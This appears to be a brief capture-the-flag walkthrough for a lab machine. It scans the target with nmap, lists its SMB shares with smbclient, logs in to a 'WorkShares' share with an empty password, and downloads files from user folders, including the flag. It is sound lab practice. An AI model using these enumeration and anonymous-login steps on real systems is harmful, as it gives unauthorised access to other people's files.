##Check connectivity
ping 10.129.124.189

#Check open ports and their versions
sudo nmap -sV 10.129.124.189

#install smbclient
sudo apt-get install smbclient

#Display the shares
smbclient -L 10.129.124.189


#Log in to Workshares since it was the only one working
smbclient \\\\10.129.124.189\\WorkShares
#password was empty too
help #see the commands
ls #list contents of the directory
cd Amy.J #enter this directory
get worknotes.txt #download this file
cd .. #go back 
cd James.P 
ls 
get flag.txt
exit #exit smbclient
cat flag.txt #found the flag
